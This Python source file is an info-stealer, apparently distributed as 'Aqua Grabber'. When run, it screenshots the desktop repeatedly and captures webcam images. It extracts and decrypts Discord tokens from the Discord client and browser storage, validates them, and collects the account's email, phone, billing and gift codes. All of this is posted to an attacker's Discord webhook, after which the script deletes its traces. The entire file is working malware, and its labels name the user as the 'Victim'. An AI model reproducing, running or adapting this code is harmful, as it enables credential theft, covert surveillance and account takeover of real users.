import base64
import shutil
import glob
import subprocess
from random import randint

import cv2
import requests
import win32com.client
import os
import re
from json import loads
from requests import post

import win32crypt

from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss
from Cryptodome.Cipher import AES
from Crypto.Cipher import AES

user = os.environ.get("USERNAME")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
Aqua = "C:/Users/Public/Aqua"


def get_HWID():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")
    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
        os.mkdir("C:/Users/Public/Aqua/Cam")
    if not os.path.exists('C:/Users/Public/Aqua/Info'):
        os.mkdir("C:/Users/Public/Aqua/Info")


def takeSS():
    for i in range(50):
        with mss() as sct:
            sct.shot(mon=-1, output=f"{Aqua}/ss/{i}.png")
            print(f"Done SS Number {i}")

    frame_folder = f'{Aqua}/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"{Aqua}/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=100, loop=1)

    make_gif()
    with open(f'{Aqua}/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done Taking ScreenShots")
    webhook.execute()
    webhook.remove_files()


def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(1):
                    return_value, image = camera.read()
                    cv2.imwrite(f'{Aqua}/Cam/{str(x)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera
                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_HWID()}```'
                with open(f'{Aqua}/Cam/{x}.png', 'rb') as f:
                    file_data = f.read()
                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.png')
                print(f"Done Grabbing Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
            except:
                webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
                print(f"Failed Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
    except:
        webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
        print(f"Unknown Error")
        webhook.execute()
        webhook.remove_files()


def getDcToken():
    tokenPaths = {
        'Discord': f"{roaming}\\Discord",
        'Discord Canary': f"{roaming}\\discordcanary",
        'Discord PTB': f"{roaming}\\discordptb",
        'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
        'Opera': f"{roaming}\\Opera Software\\Opera Stable",
        'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
        'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
    }
    fileInfo = f"tokens_" + os.getlogin() + ".txt"

    def checkToken(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
        if "You need to verify your account in order to perform this action." in str(
                response.content) or "401: Unauthorized" in str(response.content):
            return False
        else:
            return True

    def variant2_Status(token):
        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
        if response.status_code == 401:
            return False
        elif "You need to verify your account in order to perform this action." in str(response.content):
            return True
        else:
            return True

    def decrypt_token(buff, master_key):
        try:
            return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                           buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            pass

    def getUserData(token):
        TokenUser = requests.get(
            'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get(
            'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get(
            'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        friends = requests.get(
            'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
        gift_codes = requests.get(
            'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
            headers={'Authorization': token}).json()

        def HasBilling():
            if str(billing) == "[]":
                return f"\n💳 Billing : :x:\n\n"
            else:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')

                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)
                return f"\n💳 Billing : ```{payment_methods}```"

        def getGuilds():
            NumberOfServer = 0
            for guild in guilds:
                # gonna continue here later
                NumberOfServer = NumberOfServer + 1
            return f"\n:floppy_disk: Victim Is In `{NumberOfServer}` Discord Guilds"

        def HasGifts():
            if str(gift_codes) == "[]":
                return f"\n<a:gift:1021608479808569435> Gift Codes : :x:\n\n"
            else:
                return f"\n<a:gift:1021608479808569435> Gift Codes : ```{gift_codes}```"

        username = TokenUser['username'] + '#' + TokenUser['discriminator']
        user_id = TokenUser['id']
        email = TokenUser['email']
        phone = TokenUser['phone']
        mfa = TokenUser['mfa_enabled']
        nitro = bool(TokenUser.get("premium_type"))
        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif" if requests.get(
            f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.png"
        webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
        webhook.add_embed(embed)
        embed.set_title(f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>\n\nUsername : `{username}`")
        embed.set_image(avatar)
        embed.set_description(
            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
        embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & laylaa | Grabbed By Aqua 💦")

        webhook.execute()
        webhook.remove_files()
        webhook.remove_embeds()
        print(getGuilds())
        print("ONG THIS ONE WORKED")

    def get_tokens(path):
        cleaned = []
        tokens = []
        done = []
        lev_db = f"{path}\\Local Storage\\leveldb\\"
        loc_state = f"{path}\\Local State"
        # new method with encryption
        if os.path.exists(loc_state):
            with open(loc_state, "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
            for file in os.listdir(lev_db):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(lev_db + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError:
                        continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                done += [decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])]

        else:  # old method without encryption
            for file_name in os.listdir(path):
                try:
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                done.append(token)
                except:
                    continue

        return done

    def main_tokens():
        for platform, path in tokenPaths.items():
            if not os.path.exists(path):
                continue
            try:
                tokens = set(get_tokens(path))
            except:
                continue
            if not tokens:
                continue
            with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
                for i in tokens:
                    f.write(str(i) + "\n")
                    print(f"{i} [1: {checkToken(i)}] [2: {variant2_Status(i)}]")
                    if checkToken(i) & variant2_Status(i):
                        try:
                            getUserData(i)
                        except:
                            print("Token Invalid")

    main_tokens()


# Clean Up
def cleanUp():
    shutil.rmtree(Aqua)


webhook_url = 'Webhook_here'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"
webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252/1181320259333005373/de750a3b084de1802279c1f42ab0fc33.png?ex=6580a139&is=656e2c39&hm=647afff7f3e0e7e3a7f912ce7da5d30e3599ae61695e0dea54333bbba8d5db02&"


def runAqua():
    makeDir()
    takeSS()
    getCam()
    getDcToken()
    cleanUp()


runAqua()
